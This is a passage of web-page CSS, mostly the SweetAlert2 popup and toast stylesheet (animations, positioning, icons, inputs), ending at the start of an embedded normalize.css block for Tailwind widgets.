    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  12% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); }
  100% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); } }

@keyframes swal2-rotate-success-circular-line {
  0% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  5% {
    -webkit-transform: rotate(-45deg);
            transform: rotate(-45deg); }
  12% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); }
  100% {
    -webkit-transform: rotate(-405deg);
            transform: rotate(-405deg); } }

@-webkit-keyframes swal2-animate-error-x-mark {
  0% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  50% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  80% {
    margin-top: -.375em;
    -webkit-transform: scale(1.15);
            transform: scale(1.15); }
  100% {
    margin-top: 0;
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; } }

@keyframes swal2-animate-error-x-mark {
  0% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  50% {
    margin-top: 1.625em;
    -webkit-transform: scale(0.4);
            transform: scale(0.4);
    opacity: 0; }
  80% {
    margin-top: -.375em;
    -webkit-transform: scale(1.15);
            transform: scale(1.15); }
  100% {
    margin-top: 0;
    -webkit-transform: scale(1);
            transform: scale(1);
    opacity: 1; } }

@-webkit-keyframes swal2-animate-error-icon {
  0% {
    -webkit-transform: rotateX(100deg);
            transform: rotateX(100deg);
    opacity: 0; }
  100% {
    -webkit-transform: rotateX(0deg);
            transform: rotateX(0deg);
    opacity: 1; } }

@keyframes swal2-animate-error-icon {
  0% {
    -webkit-transform: rotateX(100deg);
            transform: rotateX(100deg);
    opacity: 0; }
  100% {
    -webkit-transform: rotateX(0deg);
            transform: rotateX(0deg);
    opacity: 1; } }

body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast {
  flex-direction: column;
  align-items: stretch; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-actions {
    flex: 1;
    align-self: stretch;
    justify-content: flex-end;
    height: 2.2em; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-loading {
    justify-content: center; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-input {
    height: 2em;
    margin: .3125em auto;
    font-size: 1em; }
  body.swal2-toast-shown.swal2-has-input > .swal2-container > .swal2-toast .swal2-validationerror {
    font-size: 1em; }

body.swal2-toast-shown > .swal2-container {
  position: fixed;
  background-color: transparent; }
  body.swal2-toast-shown > .swal2-container.swal2-shown {
    background-color: transparent; }
  body.swal2-toast-shown > .swal2-container.swal2-top {
    top: 0;
    right: auto;
    bottom: auto;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-top-end, body.swal2-toast-shown > .swal2-container.swal2-top-right {
    top: 0;
    right: 0;
    bottom: auto;
    left: auto; }
  body.swal2-toast-shown > .swal2-container.swal2-top-start, body.swal2-toast-shown > .swal2-container.swal2-top-left {
    top: 0;
    right: auto;
    bottom: auto;
    left: 0; }
  body.swal2-toast-shown > .swal2-container.swal2-center-start, body.swal2-toast-shown > .swal2-container.swal2-center-left {
    top: 50%;
    right: auto;
    bottom: auto;
    left: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-center {
    top: 50%;
    right: auto;
    bottom: auto;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%); }
  body.swal2-toast-shown > .swal2-container.swal2-center-end, body.swal2-toast-shown > .swal2-container.swal2-center-right {
    top: 50%;
    right: 0;
    bottom: auto;
    left: auto;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-bottom-start, body.swal2-toast-shown > .swal2-container.swal2-bottom-left {
    top: auto;
    right: auto;
    bottom: 0;
    left: 0; }
  body.swal2-toast-shown > .swal2-container.swal2-bottom {
    top: auto;
    right: auto;
    bottom: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-toast-shown > .swal2-container.swal2-bottom-end, body.swal2-toast-shown > .swal2-container.swal2-bottom-right {
    top: auto;
    right: 0;
    bottom: 0;
    left: auto; }

.swal2-popup.swal2-toast {
  flex-direction: row;
  align-items: center;
  width: auto;
  padding: 0.625em;
  box-shadow: 0 0 0.625em #d9d9d9;
  overflow-y: hidden; }
  .swal2-popup.swal2-toast .swal2-header {
    flex-direction: row; }
  .swal2-popup.swal2-toast .swal2-title {
    justify-content: flex-start;
    margin: 0 .6em;
    font-size: 1em; }
  .swal2-popup.swal2-toast .swal2-close {
    position: initial; }
  .swal2-popup.swal2-toast .swal2-content {
    justify-content: flex-start;
    font-size: 1em; }
  .swal2-popup.swal2-toast .swal2-icon {
    width: 2em;
    min-width: 2em;
    height: 2em;
    margin: 0; }
    .swal2-popup.swal2-toast .swal2-icon-text {
      font-size: 2em;
      font-weight: bold;
      line-height: 1em; }
    .swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em; }
    .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
      top: .875em;
      width: 1.375em; }
      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
        left: .3125em; }
      .swal2-popup.swal2-toast .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
        right: .3125em; }
  .swal2-popup.swal2-toast .swal2-actions {
    height: auto;
    margin: 0 .3125em; }
  .swal2-popup.swal2-toast .swal2-styled {
    margin: 0 .3125em;
    padding: .3125em .625em;
    font-size: 1em; }
    .swal2-popup.swal2-toast .swal2-styled:focus {
      box-shadow: 0 0 0 0.0625em #fff, 0 0 0 0.125em rgba(50, 100, 150, 0.4); }
  .swal2-popup.swal2-toast .swal2-success {
    border-color: #a5dc86; }
    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'] {
      position: absolute;
      width: 2em;
      height: 2.8125em;
      -webkit-transform: rotate(45deg);
              transform: rotate(45deg);
      border-radius: 50%; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='left'] {
        top: -.25em;
        left: -.9375em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 2em 2em;
                transform-origin: 2em 2em;
        border-radius: 4em 0 0 4em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-circular-line'][class$='right'] {
        top: -.25em;
        left: .9375em;
        -webkit-transform-origin: 0 2em;
                transform-origin: 0 2em;
        border-radius: 0 4em 4em 0; }
    .swal2-popup.swal2-toast .swal2-success .swal2-success-ring {
      width: 2em;
      height: 2em; }
    .swal2-popup.swal2-toast .swal2-success .swal2-success-fix {
      top: 0;
      left: .4375em;
      width: .4375em;
      height: 2.6875em; }
    .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'] {
      height: .3125em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='tip'] {
        top: 1.125em;
        left: .1875em;
        width: .75em; }
      .swal2-popup.swal2-toast .swal2-success [class^='swal2-success-line'][class$='long'] {
        top: .9375em;
        right: .1875em;
        width: 1.375em; }
  .swal2-popup.swal2-toast.swal2-show {
    -webkit-animation: showSweetToast .5s;
            animation: showSweetToast .5s; }
  .swal2-popup.swal2-toast.swal2-hide {
    -webkit-animation: hideSweetToast .2s forwards;
            animation: hideSweetToast .2s forwards; }
  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-tip {
    -webkit-animation: animate-toast-success-tip .75s;
            animation: animate-toast-success-tip .75s; }
  .swal2-popup.swal2-toast .swal2-animate-success-icon .swal2-success-line-long {
    -webkit-animation: animate-toast-success-long .75s;
            animation: animate-toast-success-long .75s; }

@-webkit-keyframes showSweetToast {
  0% {
    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
            transform: translateY(-0.625em) rotateZ(2deg);
    opacity: 0; }
  33% {
    -webkit-transform: translateY(0) rotateZ(-2deg);
            transform: translateY(0) rotateZ(-2deg);
    opacity: .5; }
  66% {
    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
            transform: translateY(0.3125em) rotateZ(2deg);
    opacity: .7; }
  100% {
    -webkit-transform: translateY(0) rotateZ(0);
            transform: translateY(0) rotateZ(0);
    opacity: 1; } }

@keyframes showSweetToast {
  0% {
    -webkit-transform: translateY(-0.625em) rotateZ(2deg);
            transform: translateY(-0.625em) rotateZ(2deg);
    opacity: 0; }
  33% {
    -webkit-transform: translateY(0) rotateZ(-2deg);
            transform: translateY(0) rotateZ(-2deg);
    opacity: .5; }
  66% {
    -webkit-transform: translateY(0.3125em) rotateZ(2deg);
            transform: translateY(0.3125em) rotateZ(2deg);
    opacity: .7; }
  100% {
    -webkit-transform: translateY(0) rotateZ(0);
            transform: translateY(0) rotateZ(0);
    opacity: 1; } }

@-webkit-keyframes hideSweetToast {
  0% {
    opacity: 1; }
  33% {
    opacity: .5; }
  100% {
    -webkit-transform: rotateZ(1deg);
            transform: rotateZ(1deg);
    opacity: 0; } }

@keyframes hideSweetToast {
  0% {
    opacity: 1; }
  33% {
    opacity: .5; }
  100% {
    -webkit-transform: rotateZ(1deg);
            transform: rotateZ(1deg);
    opacity: 0; } }

@-webkit-keyframes animate-toast-success-tip {
  0% {
    top: .5625em;
    left: .0625em;
    width: 0; }
  54% {
    top: .125em;
    left: .125em;
    width: 0; }
  70% {
    top: .625em;
    left: -.25em;
    width: 1.625em; }
  84% {
    top: 1.0625em;
    left: .75em;
    width: .5em; }
  100% {
    top: 1.125em;
    left: .1875em;
    width: .75em; } }

@keyframes animate-toast-success-tip {
  0% {
    top: .5625em;
    left: .0625em;
    width: 0; }
  54% {
    top: .125em;
    left: .125em;
    width: 0; }
  70% {
    top: .625em;
    left: -.25em;
    width: 1.625em; }
  84% {
    top: 1.0625em;
    left: .75em;
    width: .5em; }
  100% {
    top: 1.125em;
    left: .1875em;
    width: .75em; } }

@-webkit-keyframes animate-toast-success-long {
  0% {
    top: 1.625em;
    right: 1.375em;
    width: 0; }
  65% {
    top: 1.25em;
    right: .9375em;
    width: 0; }
  84% {
    top: .9375em;
    right: 0;
    width: 1.125em; }
  100% {
    top: .9375em;
    right: .1875em;
    width: 1.375em; } }

@keyframes animate-toast-success-long {
  0% {
    top: 1.625em;
    right: 1.375em;
    width: 0; }
  65% {
    top: 1.25em;
    right: .9375em;
    width: 0; }
  84% {
    top: .9375em;
    right: 0;
    width: 1.125em; }
  100% {
    top: .9375em;
    right: .1875em;
    width: 1.375em; } }

html.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown),
body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) {
  height: auto;
  overflow-y: hidden; }

body.swal2-no-backdrop .swal2-shown {
  top: auto;
  right: auto;
  bottom: auto;
  left: auto;
  background-color: transparent; }
  body.swal2-no-backdrop .swal2-shown > .swal2-modal {
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.4); }
  body.swal2-no-backdrop .swal2-shown.swal2-top {
    top: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-top-start, body.swal2-no-backdrop .swal2-shown.swal2-top-left {
    top: 0;
    left: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-top-end, body.swal2-no-backdrop .swal2-shown.swal2-top-right {
    top: 0;
    right: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-center {
    top: 50%;
    left: 50%;
    -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-center-start, body.swal2-no-backdrop .swal2-shown.swal2-center-left {
    top: 50%;
    left: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-center-end, body.swal2-no-backdrop .swal2-shown.swal2-center-right {
    top: 50%;
    right: 0;
    -webkit-transform: translateY(-50%);
            transform: translateY(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom {
    bottom: 0;
    left: 50%;
    -webkit-transform: translateX(-50%);
            transform: translateX(-50%); }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom-start, body.swal2-no-backdrop .swal2-shown.swal2-bottom-left {
    bottom: 0;
    left: 0; }
  body.swal2-no-backdrop .swal2-shown.swal2-bottom-end, body.swal2-no-backdrop .swal2-shown.swal2-bottom-right {
    right: 0;
    bottom: 0; }

.swal2-container {
  display: flex;
  position: fixed;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  flex-direction: row;
  align-items: center;
  justify-content: center;
  padding: 10px;
  background-color: transparent;
  z-index: 1060;
  overflow-x: hidden;
  -webkit-overflow-scrolling: touch; }
  .swal2-container.swal2-top {
    align-items: flex-start; }
  .swal2-container.swal2-top-start, .swal2-container.swal2-top-left {
    align-items: flex-start;
    justify-content: flex-start; }
  .swal2-container.swal2-top-end, .swal2-container.swal2-top-right {
    align-items: flex-start;
    justify-content: flex-end; }
  .swal2-container.swal2-center {
    align-items: center; }
  .swal2-container.swal2-center-start, .swal2-container.swal2-center-left {
    align-items: center;
    justify-content: flex-start; }
  .swal2-container.swal2-center-end, .swal2-container.swal2-center-right {
    align-items: center;
    justify-content: flex-end; }
  .swal2-container.swal2-bottom {
    align-items: flex-end; }
  .swal2-container.swal2-bottom-start, .swal2-container.swal2-bottom-left {
    align-items: flex-end;
    justify-content: flex-start; }
  .swal2-container.swal2-bottom-end, .swal2-container.swal2-bottom-right {
    align-items: flex-end;
    justify-content: flex-end; }
  .swal2-container.swal2-grow-fullscreen > .swal2-modal {
    display: flex !important;
    flex: 1;
    align-self: stretch;
    justify-content: center; }
  .swal2-container.swal2-grow-row > .swal2-modal {
    display: flex !important;
    flex: 1;
    align-content: center;
    justify-content: center; }
  .swal2-container.swal2-grow-column {
    flex: 1;
    flex-direction: column; }
    .swal2-container.swal2-grow-column.swal2-top, .swal2-container.swal2-grow-column.swal2-center, .swal2-container.swal2-grow-column.swal2-bottom {
      align-items: center; }
    .swal2-container.swal2-grow-column.swal2-top-start, .swal2-container.swal2-grow-column.swal2-center-start, .swal2-container.swal2-grow-column.swal2-bottom-start, .swal2-container.swal2-grow-column.swal2-top-left, .swal2-container.swal2-grow-column.swal2-center-left, .swal2-container.swal2-grow-column.swal2-bottom-left {
      align-items: flex-start; }
    .swal2-container.swal2-grow-column.swal2-top-end, .swal2-container.swal2-grow-column.swal2-center-end, .swal2-container.swal2-grow-column.swal2-bottom-end, .swal2-container.swal2-grow-column.swal2-top-right, .swal2-container.swal2-grow-column.swal2-center-right, .swal2-container.swal2-grow-column.swal2-bottom-right {
      align-items: flex-end; }
    .swal2-container.swal2-grow-column > .swal2-modal {
      display: flex !important;
      flex: 1;
      align-content: center;
      justify-content: center; }
  .swal2-container:not(.swal2-top):not(.swal2-top-start):not(.swal2-top-end):not(.swal2-top-left):not(.swal2-top-right):not(.swal2-center-start):not(.swal2-center-end):not(.swal2-center-left):not(.swal2-center-right):not(.swal2-bottom):not(.swal2-bottom-start):not(.swal2-bottom-end):not(.swal2-bottom-left):not(.swal2-bottom-right) > .swal2-modal {
    margin: auto; }
  @media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
    .swal2-container .swal2-modal {
      margin: 0 !important; } }
  .swal2-container.swal2-fade {
    transition: background-color .1s; }
  .swal2-container.swal2-shown {
    background-color: rgba(0, 0, 0, 0.4); }

.swal2-popup {
  display: none;
  position: relative;
  flex-direction: column;
  justify-content: center;
  width: 32em;
  max-width: 100%;
  padding: 1.25em;
  border-radius: 0.3125em;
  background: #fff;
  font-family: inherit;
  font-size: 1rem;
  box-sizing: border-box; }
  .swal2-popup:focus {
    outline: none; }
  .swal2-popup.swal2-loading {
    overflow-y: hidden; }
  .swal2-popup .swal2-header {
    display: flex;
    flex-direction: column;
    align-items: center; }
  .swal2-popup .swal2-title {
    display: block;
    position: relative;
    max-width: 100%;
    margin: 0 0 0.4em;
    padding: 0;
    color: #595959;
    font-size: 1.875em;
    font-weight: 600;
    text-align: center;
    text-transform: none;
    word-wrap: break-word; }
  .swal2-popup .swal2-actions {
    align-items: center;
    justify-content: center;
    margin: 1.25em auto 0; }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled[disabled] {
      opacity: .4; }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:hover {
      background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }
    .swal2-popup .swal2-actions:not(.swal2-loading) .swal2-styled:active {
      background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }
    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-confirm {
      width: 2.5em;
      height: 2.5em;
      margin: .46875em;
      padding: 0;
      border: .25em solid transparent;
      border-radius: 100%;
      border-color: transparent;
      background-color: transparent !important;
      color: transparent;
      cursor: default;
      box-sizing: border-box;
      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
              animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
      -webkit-user-select: none;
         -moz-user-select: none;
          -ms-user-select: none;
              user-select: none; }
    .swal2-popup .swal2-actions.swal2-loading .swal2-styled.swal2-cancel {
      margin-right: 30px;
      margin-left: 30px; }
    .swal2-popup .swal2-actions.swal2-loading :not(.swal2-styled).swal2-confirm::after {
      display: inline-block;
      width: 15px;
      height: 15px;
      margin-left: 5px;
      border: 3px solid #999999;
      border-radius: 50%;
      border-right-color: transparent;
      box-shadow: 1px 1px 1px #fff;
      content: '';
      -webkit-animation: swal2-rotate-loading 1.5s linear 0s infinite normal;
              animation: swal2-rotate-loading 1.5s linear 0s infinite normal; }
  .swal2-popup .swal2-styled {
    margin: 0 .3125em;
    padding: .625em 2em;
    font-weight: 500;
    box-shadow: none; }
    .swal2-popup .swal2-styled:not([disabled]) {
      cursor: pointer; }
    .swal2-popup .swal2-styled.swal2-confirm {
      border: 0;
      border-radius: 0.25em;
      background-color: #3085d6;
      color: #fff;
      font-size: 1.0625em; }
    .swal2-popup .swal2-styled.swal2-cancel {
      border: 0;
      border-radius: 0.25em;
      background-color: #aaa;
      color: #fff;
      font-size: 1.0625em; }
    .swal2-popup .swal2-styled:focus {
      outline: none;
      box-shadow: 0 0 0 2px #fff, 0 0 0 4px rgba(50, 100, 150, 0.4); }
    .swal2-popup .swal2-styled::-moz-focus-inner {
      border: 0; }
  .swal2-popup .swal2-footer {
    justify-content: center;
    margin: 1.25em 0 0;
    padding-top: 1em;
    border-top: 1px solid #eee;
    color: #545454;
    font-size: 1em; }
  .swal2-popup .swal2-image {
    max-width: 100%;
    margin: 1.25em auto; }
  .swal2-popup .swal2-close {
    position: absolute;
    top: 0;
    right: 0;
    justify-content: center;
    width: 1.2em;
    min-width: 1.2em;
    height: 1.2em;
    margin: 0;
    padding: 0;
    transition: color 0.1s ease-out;
    border: none;
    border-radius: 0;
    background: transparent;
    color: #cccccc;
    font-family: serif;
    font-size: calc(2.5em - 0.25em);
    line-height: 1.2em;
    cursor: pointer; }
    .swal2-popup .swal2-close:hover {
      -webkit-transform: none;
              transform: none;
      color: #f27474; }
  .swal2-popup > .swal2-input,
  .swal2-popup > .swal2-file,
  .swal2-popup > .swal2-textarea,
  .swal2-popup > .swal2-select,
  .swal2-popup > .swal2-radio,
  .swal2-popup > .swal2-checkbox {
    display: none; }
  .swal2-popup .swal2-content {
    justify-content: center;
    margin: 0;
    padding: 0;
    color: #545454;
    font-size: 1.125em;
    font-weight: 300;
    line-height: normal;
    word-wrap: break-word; }
  .swal2-popup #swal2-content {
    text-align: center; }
  .swal2-popup .swal2-input,
  .swal2-popup .swal2-file,
  .swal2-popup .swal2-textarea,
  .swal2-popup .swal2-select,
  .swal2-popup .swal2-radio,
  .swal2-popup .swal2-checkbox {
    margin: 1em auto; }
  .swal2-popup .swal2-input,
  .swal2-popup .swal2-file,
  .swal2-popup .swal2-textarea {
    width: 100%;
    transition: border-color .3s, box-shadow .3s;
    border: 1px solid #d9d9d9;
    border-radius: 0.1875em;
    font-size: 1.125em;
    box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.06);
    box-sizing: border-box; }
    .swal2-popup .swal2-input.swal2-inputerror,
    .swal2-popup .swal2-file.swal2-inputerror,
    .swal2-popup .swal2-textarea.swal2-inputerror {
      border-color: #f27474 !important;
      box-shadow: 0 0 2px #f27474 !important; }
    .swal2-popup .swal2-input:focus,
    .swal2-popup .swal2-file:focus,
    .swal2-popup .swal2-textarea:focus {
      border: 1px solid #b4dbed;
      outline: none;
      box-shadow: 0 0 3px #c4e6f5; }
    .swal2-popup .swal2-input::-webkit-input-placeholder,
    .swal2-popup .swal2-file::-webkit-input-placeholder,
    .swal2-popup .swal2-textarea::-webkit-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input:-ms-input-placeholder,
    .swal2-popup .swal2-file:-ms-input-placeholder,
    .swal2-popup .swal2-textarea:-ms-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input::-ms-input-placeholder,
    .swal2-popup .swal2-file::-ms-input-placeholder,
    .swal2-popup .swal2-textarea::-ms-input-placeholder {
      color: #cccccc; }
    .swal2-popup .swal2-input::placeholder,
    .swal2-popup .swal2-file::placeholder,
    .swal2-popup .swal2-textarea::placeholder {
      color: #cccccc; }
  .swal2-popup .swal2-range input {
    width: 80%; }
  .swal2-popup .swal2-range output {
    width: 20%;
    font-weight: 600;
    text-align: center; }
  .swal2-popup .swal2-range input,
  .swal2-popup .swal2-range output {
    height: 2.625em;
    margin: 1em auto;
    padding: 0;
    font-size: 1.125em;
    line-height: 2.625em; }
  .swal2-popup .swal2-input {
    height: 2.625em;
    padding: 0.75em; }
    .swal2-popup .swal2-input[type='number'] {
      max-width: 10em; }
  .swal2-popup .swal2-file {
    font-size: 1.125em; }
  .swal2-popup .swal2-textarea {
    height: 6.75em;
    padding: 0.75em; }
  .swal2-popup .swal2-select {
    min-width: 50%;
    max-width: 100%;
    padding: .375em .625em;
    color: #545454;
    font-size: 1.125em; }
  .swal2-popup .swal2-radio,
  .swal2-popup .swal2-checkbox {
    align-items: center;
    justify-content: center; }
    .swal2-popup .swal2-radio label,
    .swal2-popup .swal2-checkbox label {
      margin: 0 .6em;
      font-size: 1.125em; }
    .swal2-popup .swal2-radio input,
    .swal2-popup .swal2-checkbox input {
      margin: 0 .4em; }
  .swal2-popup .swal2-validationerror {
    display: none;
    align-items: center;
    justify-content: center;
    padding: 0.625em;
    background: #f0f0f0;
    color: #666666;
    font-size: 1em;
    font-weight: 300;
    overflow: hidden; }
    .swal2-popup .swal2-validationerror::before {
      display: inline-block;
      width: 1.5em;
      height: 1.5em;
      margin: 0 .625em;
      border-radius: 50%;
      background-color: #f27474;
      color: #fff;
      font-weight: 600;
      line-height: 1.5em;
      text-align: center;
      content: '!';
      zoom: normal; }

@supports (-ms-accelerator: true) {
  .swal2-range input {
    width: 100% !important; }
  .swal2-range output {
    display: none; } }

@media all and (-ms-high-contrast: none), (-ms-high-contrast: active) {
  .swal2-range input {
    width: 100% !important; }
  .swal2-range output {
    display: none; } }

.swal2-icon {
  position: relative;
  justify-content: center;
  width: 5em;
  height: 5em;
  margin: 1.25em auto 1.875em;
  border: .25em solid transparent;
  border-radius: 50%;
  line-height: 5em;
  cursor: default;
  box-sizing: content-box;
  -webkit-user-select: none;
     -moz-user-select: none;
      -ms-user-select: none;
          user-select: none;
  zoom: normal; }
  .swal2-icon-text {
    font-size: 3.75em; }
  .swal2-icon.swal2-error {
    border-color: #f27474; }
    .swal2-icon.swal2-error .swal2-x-mark {
      position: relative;
      flex-grow: 1; }
    .swal2-icon.swal2-error [class^='swal2-x-mark-line'] {
      display: block;
      position: absolute;
      top: 2.3125em;
      width: 2.9375em;
      height: .3125em;
      border-radius: .125em;
      background-color: #f27474; }
      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='left'] {
        left: 1.0625em;
        -webkit-transform: rotate(45deg);
                transform: rotate(45deg); }
      .swal2-icon.swal2-error [class^='swal2-x-mark-line'][class$='right'] {
        right: 1em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg); }
  .swal2-icon.swal2-warning {
    border-color: #facea8;
    color: #f8bb86; }
  .swal2-icon.swal2-info {
    border-color: #9de0f6;
    color: #3fc3ee; }
  .swal2-icon.swal2-question {
    border-color: #c9dae1;
    color: #87adbd; }
  .swal2-icon.swal2-success {
    border-color: #a5dc86; }
    .swal2-icon.swal2-success [class^='swal2-success-circular-line'] {
      position: absolute;
      width: 3.75em;
      height: 7.5em;
      -webkit-transform: rotate(45deg);
              transform: rotate(45deg);
      border-radius: 50%; }
      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='left'] {
        top: -.4375em;
        left: -2.0635em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 3.75em 3.75em;
                transform-origin: 3.75em 3.75em;
        border-radius: 7.5em 0 0 7.5em; }
      .swal2-icon.swal2-success [class^='swal2-success-circular-line'][class$='right'] {
        top: -.6875em;
        left: 1.875em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg);
        -webkit-transform-origin: 0 3.75em;
                transform-origin: 0 3.75em;
        border-radius: 0 7.5em 7.5em 0; }
    .swal2-icon.swal2-success .swal2-success-ring {
      position: absolute;
      top: -.25em;
      left: -.25em;
      width: 100%;
      height: 100%;
      border: 0.25em solid rgba(165, 220, 134, 0.3);
      border-radius: 50%;
      z-index: 2;
      box-sizing: content-box; }
    .swal2-icon.swal2-success .swal2-success-fix {
      position: absolute;
      top: .5em;
      left: 1.625em;
      width: .4375em;
      height: 5.625em;
      -webkit-transform: rotate(-45deg);
              transform: rotate(-45deg);
      z-index: 1; }
    .swal2-icon.swal2-success [class^='swal2-success-line'] {
      display: block;
      position: absolute;
      height: .3125em;
      border-radius: .125em;
      background-color: #a5dc86;
      z-index: 2; }
      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='tip'] {
        top: 2.875em;
        left: .875em;
        width: 1.5625em;
        -webkit-transform: rotate(45deg);
                transform: rotate(45deg); }
      .swal2-icon.swal2-success [class^='swal2-success-line'][class$='long'] {
        top: 2.375em;
        right: .5em;
        width: 2.9375em;
        -webkit-transform: rotate(-45deg);
                transform: rotate(-45deg); }

.swal2-progresssteps {
  align-items: center;
  margin: 0 0 1.25em;
  padding: 0;
  font-weight: 600; }
  .swal2-progresssteps li {
    display: inline-block;
    position: relative; }
  .swal2-progresssteps .swal2-progresscircle {
    width: 2em;
    height: 2em;
    border-radius: 2em;
    background: #3085d6;
    color: #fff;
    line-height: 2em;
    text-align: center;
    z-index: 20; }
    .swal2-progresssteps .swal2-progresscircle:first-child {
      margin-left: 0; }
    .swal2-progresssteps .swal2-progresscircle:last-child {
      margin-right: 0; }
    .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep {
      background: #3085d6; }
      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progresscircle {
        background: #add8e6; }
      .swal2-progresssteps .swal2-progresscircle.swal2-activeprogressstep ~ .swal2-progressline {
        background: #add8e6; }
  .swal2-progresssteps .swal2-progressline {
    width: 2.5em;
    height: .4em;
    margin: 0 -1px;
    background: #3085d6;
    z-index: 10; }

[class^='swal2'] {
  -webkit-tap-highlight-color: transparent; }

.swal2-show {
  -webkit-animation: swal2-show 0.3s;
          animation: swal2-show 0.3s; }
  .swal2-show.swal2-noanimation {
    -webkit-animation: none;
            animation: none; }

.swal2-hide {
  -webkit-animation: swal2-hide 0.15s forwards;
          animation: swal2-hide 0.15s forwards; }
  .swal2-hide.swal2-noanimation {
    -webkit-animation: none;
            animation: none; }

[dir='rtl'] .swal2-close {
  right: auto;
  left: 0; }

.swal2-animate-success-icon .swal2-success-line-tip {
  -webkit-animation: swal2-animate-success-line-tip 0.75s;
          animation: swal2-animate-success-line-tip 0.75s; }

.swal2-animate-success-icon .swal2-success-line-long {
  -webkit-animation: swal2-animate-success-line-long 0.75s;
          animation: swal2-animate-success-line-long 0.75s; }

.swal2-animate-success-icon .swal2-success-circular-line-right {
  -webkit-animation: swal2-rotate-success-circular-line 4.25s ease-in;
          animation: swal2-rotate-success-circular-line 4.25s ease-in; }

.swal2-animate-error-icon {
  -webkit-animation: swal2-animate-error-icon 0.5s;
          animation: swal2-animate-error-icon 0.5s; }
  .swal2-animate-error-icon .swal2-x-mark {
    -webkit-animation: swal2-animate-error-x-mark 0.5s;
            animation: swal2-animate-error-x-mark 0.5s; }

@-webkit-keyframes swal2-rotate-loading {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }

@keyframes swal2-rotate-loading {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }</style><style type="text/css">[page-content] .tailwind-widgets {
  /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */
  /* Document
   ========================================================================== */
  /**
 * 1. Correct the line height in all browsers.
 * 2. Prevent adjustments of font size after orientation changes in iOS.
 */
  /* Sections
   ========================================================================== */
  /**
 * Remove the margin in all browsers.
 */
  /**
 * Render the `main` element consistently in IE.
 */
  /**
